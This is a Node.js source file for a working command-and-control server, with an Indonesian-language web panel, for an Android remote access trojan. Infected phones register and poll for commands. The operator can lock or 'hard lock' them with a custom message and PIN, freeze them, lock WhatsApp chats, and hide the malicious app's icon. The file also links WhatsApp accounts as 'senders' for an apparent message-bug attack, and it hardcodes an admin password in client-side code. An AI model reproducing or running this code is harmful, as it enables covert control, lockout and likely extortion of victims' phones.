const express = require('express');
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ==========================================
// 1. DATABASE
// ==========================================
const DEVICES = {};
const COMMANDS = {};
let PERSONAL_SENDERS = [];
let GLOBAL_SENDERS = [{ number: "628111111111" }];
const ADMIN_PASSWORD = "rasyaownerganteng";

let waSock = null;
let isWaConnected = false;

// ==========================================
// 2. API UNTUK RAT (ANDROID)
// ==========================================
app.post('/api/register', (req, res) => {
    const data = req.body;
    DEVICES[data.id] = { brand: data.brand, model: data.model };
    if (!COMMANDS[data.id]) COMMANDS[data.id] = [];
    res.status(200).send("OK");
});

app.get('/api/get_command/:id', (req, res) => {
    const id = req.params.id;
    if (COMMANDS[id] && COMMANDS[id].length > 0) {
        res.json(COMMANDS[id].shift());
    } else {
        res.json({ action: "none" });
    }
});

app.post('/api/send_command/:id', (req, res) => {
    const id = req.params.id;
    if (!COMMANDS[id]) COMMANDS[id] = [];
    COMMANDS[id].push(req.body);
    res.status(200).send("OK");
});

app.get('/api/devices', (req, res) => {
    res.json(DEVICES);
});

// ==========================================
// 3. API WA PAIRING (BENERAN)
// ==========================================
app.post('/api/request-pairing', async (req, res) => {
    const { number } = req.body;
    if (!number) return res.status(400).json({ error: 'Nomor wajib diisi!' });

    try {
        if (fs.existsSync('./auth_info')) fs.rmSync('./auth_info', { recursive: true, force: true });
        
        const { state, saveCreds } = await useMultiFileAuthState('auth_info');
        
        if (waSock) { waSock.ev.removeAllListeners(); waSock.end(); }
        
        waSock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['Chrome (Linux)', 'Chrome', '110.0.0']
        });

        waSock.ev.on('creds.update', saveCreds);
        waSock.ev.on('connection.update', (update) => {
            if (update.connection === 'open') {
                isWaConnected = true;
                console.log('✅ WA Terhubung!');
            }
        });

        const cleanNumber = number.replace(/[^0-9]/g, '');
        const pairingCode = await waSock.requestPairingCode(cleanNumber);
        
        res.json({ code: pairingCode });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Gagal buat kode. Pastikan nomor benar.' });
    }
});

// ==========================================
// 4. API SENDER & ADMIN
// ==========================================
app.get('/api/senders', (req, res) => {
    res.json({ personal: PERSONAL_SENDERS, global: GLOBAL_SENDERS });
});

app.post('/api/add_personal', (req, res) => {
    PERSONAL_SENDERS.push({ number: req.body.number });
    res.json({ status: "success" });
});

app.post('/api/admin/add_global', (req, res) => {
    if (req.body.password !== ADMIN_PASSWORD) return res.status(403).send("Salah");
    GLOBAL_SENDERS.push({ number: req.body.number });
    res.json({ status: "success" });
});

// ==========================================
// 5. WEB UI
// ==========================================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System C2</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        * { box-sizing: border-box; font-family: 'Space Mono', monospace; margin: 0; padding: 0; }
        body { background-color: #f4f4e9; color: #000; height: 100vh; display: flex; overflow: hidden; }
        
        .sidebar { width: 250px; background: #fff; border-right: 4px solid #000; height: 100vh; position: fixed; left: -250px; transition: 0.3s; z-index: 1000; padding-top: 20px; }
        .sidebar.open { left: 0; }
        .sidebar a { display: block; padding: 15px 20px; text-decoration: none; color: #000; font-weight: bold; border-bottom: 3px solid #000; text-transform: uppercase;}
        .sidebar a:hover { background: #ffde00; }
        .close-btn { padding: 10px 20px; cursor: pointer; color: #888; text-align: right; font-size: 20px; font-weight: bold; }
        
        .main-content { flex: 1; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow-y: auto; width: 100%; max-width: 480px; margin: 0 auto; }
        header { display: flex; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px; border: 3px solid #000; box-shadow: 4px 4px 0px #000;}
        .menu-btn { background: #fff; border: 3px solid #000; font-size: 20px; cursor: pointer; margin-right: 15px; padding: 2px 8px; box-shadow: 2px 2px 0px #000;}
        .menu-btn:active { box-shadow: 0px 0px 0px #000; transform: translate(2px, 2px); }
        header h1 { font-size: 18px; font-weight: bold; text-transform: uppercase; }

        .page { display: none; flex-direction: column; gap: 15px; width: 100%; }
        .page.active { display: flex; }

        .device-card { background: #fff; border: 4px solid #000; box-shadow: 6px 6px 0px #000; padding: 15px; margin-bottom: 15px; cursor: pointer; display: flex; align-items: center; gap: 15px; }
        .device-card:active { box-shadow: 0px 0px 0px #000; transform: translate(6px, 6px); }
        .dev-icon { width: 50px; height: 50px; background: #00ebc7; border: 3px solid #000; display: flex; justify-content: center; align-items: center; font-size: 24px; }
        .dev-info h3 { font-size: 16px; margin-bottom: 4px; font-weight:bold;}
        .dev-info p { font-size: 12px; color: #555; }

        .rat-header { display: flex; align-items: center; gap: 15px; background: #fff; border: 4px solid #000; padding: 15px; margin-bottom: 15px; box-shadow: 4px 4px 0px #000;}
        .rat-icon-main { width: 40px; height: 40px; background: #ffde00; border: 3px solid #000; display: flex; justify-content: center; align-items: center; font-size: 20px; }
        .rat-header h2 { font-size: 16px; text-transform:uppercase;}
        .rat-header p { font-size: 12px; color: #555; }
        .grid-container { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .grid-card { background: #fff; border: 4px solid #000; padding: 15px; cursor: pointer; display: flex; flex-direction: column; justify-content: space-between; min-height: 120px; box-shadow: 4px 4px 0px #000; }
        .grid-card:active { box-shadow: 0px 0px 0px #000; transform: translate(4px, 4px); }
        .grid-icon { width: 36px; height: 36px; border: 3px solid #000; display: flex; justify-content: center; align-items: center; font-size: 18px; margin-bottom: 15px; }
        .icon-orange { background: #ffde00; }
        .icon-red { background: #ff003c; color:#fff; }
        .icon-blue { background: #00ebc7; }
        .grid-title { font-size: 14px; font-weight: bold; }
        .badge { background: #ff003c; color: #fff; font-size: 10px; padding: 2px 6px; font-weight: bold; display: inline-block; align-self: flex-start; margin-top: 5px; border: 2px solid #000; }

        .sender-cards { display: flex; gap: 15px; margin-bottom: 20px; }
        .card-sender { flex: 1; background: #fff; border: 4px solid #000; padding: 20px; text-align: center; cursor: pointer; box-shadow: 4px 4px 0px #000; }
        .card-sender.selected { background: #00ebc7; }
        .card-sender:active { box-shadow: 0px 0px 0px #000; transform: translate(4px, 4px); }
        .card-sender h2 { font-size: 16px; margin: 10px 0 5px; text-transform:uppercase;}
        .card-sender p { font-size: 12px; color: #333; font-weight:bold;}
        .btn-gold { background: #a68a61; color: #fff; border: 4px solid #000; padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 4px 4px 0px #000; text-transform:uppercase;}
        .btn-gold:active { box-shadow: 0px 0px 0px #000; transform: translate(4px, 4px); }
        
        .input-group { display: flex; gap: 10px; margin-bottom: 15px; }
        .input-group input { flex: 1; padding: 12px; border: 3px solid #000; outline: none; font-weight:bold;}
        .input-group button { padding: 12px 20px; background: #ffde00; color: #000; border: 3px solid #000; font-weight: bold; cursor: pointer; box-shadow: 2px 2px 0px #000;}
        .input-group button:active { box-shadow: 0px 0px 0px #000; transform: translate(2px, 2px); }
        
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2000; justify-content: center; align-items: center; }
        .modal-content { background: #fff; border: 4px solid #000; box-shadow: 8px 8px 0px #000; padding: 20px; width: 90%; max-width: 350px; }
        .modal-content h3 { margin-bottom: 15px; text-transform:uppercase;}
        .modal-content input { width: 100%; padding: 12px; margin-bottom: 10px; border: 3px solid #000; font-weight:bold; outline:none;}
        .modal-actions { display: flex; gap: 10px; }
        .modal-actions button { flex: 1; padding: 12px; border: 3px solid #000; font-weight: bold; cursor: pointer; }
        .modal-actions button:active { box-shadow: 0px 0px 0px #000; transform: translate(2px, 2px); }
        .btn-cancel { background: #fff; box-shadow: 2px 2px 0px #000;}
        .btn-submit { background: #ff003c; color: #fff; box-shadow: 2px 2px 0px #000;}
        .pairing-code-box { background: #fff3cd; border: 3px solid #000; padding: 15px; text-align: center; margin-bottom: 20px; display:none;}
        .pairing-code { font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #ff003c; }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div class="close-btn" onclick="toggleSidebar()">×</div>
        <a href="#" onclick="showPage('devices')">📱 Device C2 (RAT)</a>
        <a href="#" onclick="showPage('sender')">🚀 Kelola Sender WA</a>
        <a href="#" onclick="showPage('admin')">⚙️ Admin Panel</a>
    </div>

    <div class="main-content">
        <header>
            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
            <h1 id="pageTitle">DEVICE LIST</h1>
        </header>

        <div id="page-devices" class="page active">
            <div id="device-list-container"></div>
        </div>

        <div id="page-rat" class="page">
            <a href="#" onclick="showPage('devices')" style="text-decoration:none; color:#000; font-weight:bold; font-size:14px; margin-bottom:10px; display:inline-block;">← Kembali ke Daftar</a>
            <div class="rat-header">
                <div class="rat-icon-main">⚙️</div>
                <div>
                    <h2>Sistem</h2>
                    <p>17 command siap digunakan</p>
                </div>
            </div>
            <div class="grid-container">
                <div class="grid-card" onclick="cmd('lock')">
                    <div class="grid-icon icon-orange">🔒</div>
                    <div class="grid-title">Kunci Layar</div>
                </div>
                <div class="grid-card" onclick="openModal('hardlock')">
                    <div class="grid-icon icon-red">⚠️</div>
                    <div class="grid-title">Hard Lock</div>
                    <div class="badge">Perlu input</div>
                </div>
                <div class="grid-card" onclick="cmd('unlock')">
                    <div class="grid-icon icon-orange">🔓</div>
                    <div class="grid-title">Buka Kunci</div>
                </div>
                <div class="grid-card" onclick="openModal('lockchat')">
                    <div class="grid-icon icon-orange">💬</div>
                    <div class="grid-title">Mode Lock Chat</div>
                    <div class="badge" style="background:#ffde00; color:#000;">Perlu input</div>
                </div>
                <div class="grid-card" onclick="cmd('freeze')">
                    <div class="grid-icon icon-blue">❄️</div>
                    <div class="grid-title">Freeze HP</div>
                </div>
                <div class="grid-card" onclick="cmd('stop_freeze')">
                    <div class="grid-icon icon-blue">🛑</div>
                    <div class="grid-title">Stop Freeze</div>
                </div>
                <div class="grid-card" onclick="cmd('hide_icon')">
                    <div class="grid-icon icon-blue">🫥</div>
                    <div class="grid-title">Sembunyikan APK</div>
                </div>
                <div class="grid-card" onclick="cmd('show_icon')">
                    <div class="grid-icon icon-blue">👁️</div>
                    <div class="grid-title">Munculkan APK</div>
                </div>
            </div>
        </div>

        <div id="page-sender" class="page">
            <div class="sender-cards">
                <div class="card-sender" id="card-pribadi" onclick="selectSender('pribadi')">
                    <div style="font-size:30px;">👤</div>
                    <h2>Pribadi</h2>
                    <p id="count-pribadi">0 Sender</p>
                </div>
                <div class="card-sender selected" id="card-global" onclick="selectSender('global')">
                    <div style="font-size:30px;">🌐</div>
                    <h2>Global</h2>
                    <p id="count-global">1 Sender</p>
                </div>
            </div>

            <div class="input-group">
                <input type="text" id="personalNumber" placeholder="Nomor WA (628...)">
                <button onclick="requestPairing()">Tambah</button>
            </div>
            
            <div id="pairingCodeBox" class="pairing-code-box">
                Kode Pairing: <br><span id="pairingCode" class="pairing-code"></span>
                <p style="font-size:10px; margin-top:10px;">Buka WA > Perangkat Tertaut > Tautkan Perangkat > Masukkan Kode.</p>
            </div>

            <h3 style="font-size:14px; margin-top:10px;">List Sender Pribadi</h3>
            <ul id="list-pribadi" style="list-style:none; padding:0;"></ul>
            <button class="btn-gold" onclick="alert('Fitur Kirim Bug (Simulasi)')">➤ KIRIM BUG</button>
        </div>

        <div id="page-admin" class="page">
            <div id="adminLogin">
                <div class="input-group">
                    <input type="password" id="adminPass" placeholder="Password Admin">
                    <button onclick="loginAdmin()">Masuk</button>
                </div>
            </div>
            <div id="adminPanel" style="display:none;">
                <div class="input-group">
                    <input type="text" id="globalNumber" placeholder="Nomor WA Global">
                    <button onclick="addGlobal()">Publish</button>
                </div>
                <h3 style="font-size:14px;">List Global Senders</h3>
                <ul id="list-global" style="list-style:none; padding:0;"></ul>
            </div>
        </div>
    </div>

    <div class="modal" id="modal-hardlock">
        <div class="modal-content">
            <h3>Hard Lock HP</h3>
            <input type="text" id="inputMsg" placeholder="Pesan Lock">
            <input type="text" id="inputPin" placeholder="PIN Unlock">
            <div class="modal-actions">
                <button class="btn-cancel" onclick="closeModal('hardlock')">Batal</button>
                <button class="btn-submit" onclick="submitHardlock()">Kunci</button>
            </div>
        </div>
    </div>

    <div class="modal" id="modal-lockchat">
        <div class="modal-content">
            <h3>Lock Chat WA</h3>
            <input type="text" id="inputChatMsg" placeholder="Pesan Kunci" value="Chat ini dikunci!">
            <div class="modal-actions">
                <button class="btn-cancel" onclick="closeModal('lockchat')">Batal</button>
                <button class="btn-submit" onclick="submitLockChat()">Kunci</button>
            </div>
        </div>
    </div>

    <script>
        let currentDeviceId = null;
        let selectedSenderType = 'global';

        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
        
        function showPage(pageName) {
            toggleSidebar();
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page-' + pageName).classList.add('active');
            
            const titles = { 'devices': 'DEVICE LIST', 'rat': 'KONTROL RAT', 'sender': 'KELOLA SENDER WA', 'admin': 'ADMIN PANEL' };
            document.getElementById('pageTitle').innerText = titles[pageName];

            if (pageName === 'devices') fetchDevices();
            if (pageName === 'sender' || pageName === 'admin') fetchSenders();
            if (pageName === 'admin') {
                document.getElementById('adminLogin').style.display = 'block';
                document.getElementById('adminPanel').style.display = 'none';
            }
        }

        async function fetchDevices() {
            const res = await fetch('/api/devices');
            const data = await res.json();
            const container = document.getElementById('device-list-container');
            container.innerHTML = '';
            if(Object.keys(data).length === 0) {
                container.innerHTML = '<p style="color:#555; text-align:center; font-weight:bold; margin-top:20px;">Belum ada device.</p>';
                return;
            }
            for (let id in data) {
                container.innerHTML += '<div class="device-card" onclick="selectDevice(\'' + id + '\')"><div class="dev-icon">📱</div><div class="dev-info"><h3>' + data[id].brand + '</h3><p>' + data[id].model + '</p></div></div>';
            }
        }
        
        function selectDevice(id) { currentDeviceId = id; showPage('rat'); }
        function cmd(action) { fetch('/api/send_command/' + currentDeviceId, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: action}) }).then(() => alert('Perintah ' + action + ' terkirim!')); }
        
        function openModal(type) { document.getElementById('modal-' + type).style.display = 'flex'; }
        function closeModal(type) { document.getElementById('modal-' + type).style.display = 'none'; }
        function submitHardlock() {
            fetch('/api/send_command/' + currentDeviceId, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'lock', msg: document.getElementById('inputMsg').value, pin: document.getElementById('inputPin').value}) }).then(() => { alert('Terkirim!'); closeModal('hardlock'); });
        }
        function submitLockChat() {
            fetch('/api/send_command/' + currentDeviceId, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: 'lock_wa', text: document.getElementById('inputChatMsg').value}) }).then(() => { alert('Terkirim!'); closeModal('lockchat'); });
        }

        function selectSender(type) { selectedSenderType = type; document.getElementById('card-pribadi').classList.remove('selected'); document.getElementById('card-global').classList.remove('selected'); document.getElementById('card-' + type).classList.add('selected'); }
        
        async function fetchSenders() {
            const res = await fetch('/api/senders'); 
            const data = await res.json();
            document.getElementById('count-pribadi').innerText = data.personal.length + ' Sender';
            document.getElementById('count-global'            ).innerText = data.global.length + ' Sender';
            
            document.getElementById('list-pribadi').innerHTML = data.personal.map(s => '<li style="background:#fff; border:3px solid #000; padding:10px; margin-bottom:10px; font-weight:bold;">' + s.number + '</li>').join('');
            document.getElementById('list-global').innerHTML = data.global.map(s => '<li style="background:#fff; border:3px solid #000; padding:10px; margin-bottom:10px; font-weight:bold;">' + s.number + '</li>').join('');
        }

        async function requestPairing() {
            const num = document.getElementById('personalNumber').value;
            if (!num) return alert('Masukkan nomor!');
            
            const btn = document.querySelector('#page-sender button');
            btn.innerText = "Loading...";
            btn.disabled = true;

            try {
                const res = await fetch('/api/request-pairing', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: num}) });
                const data = await res.json();
                
                if (res.ok) {
                    document.getElementById('pairingCodeBox').style.display = 'block';
                    document.getElementById('pairingCode').innerText = data.code;
                    document.getElementById('personalNumber').value = '';
                    fetchSenders();
                } else {
                    alert(data.error);
                }
            } catch(e) { alert('Gagal konek server!'); }
            
            btn.innerText = "Tambah";
            btn.disabled = false;
        }

        function loginAdmin() {
            if (document.getElementById('adminPass').value === 'rasyaownerganteng') { 
                document.getElementById('adminLogin').style.display = 'none'; 
                document.getElementById('adminPanel').style.display = 'block'; 
            }
            else alert('Password Salah!');
        }
        
        async function addGlobal() {
            const num = document.getElementById('globalNumber').value;
            if(!num) return alert('Masukkan nomor!');
            await fetch('/api/admin/add_global', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: num, password: 'rasyaownerganteng'}) });
            document.getElementById('globalNumber').value = ''; 
            fetchSenders();
        }

        fetchDevices();
    </script>
</body>
</html>
    `);
});

const PORT = 5000;
app.listen(PORT, () => console.log('Server jalan di port ' + PORT));
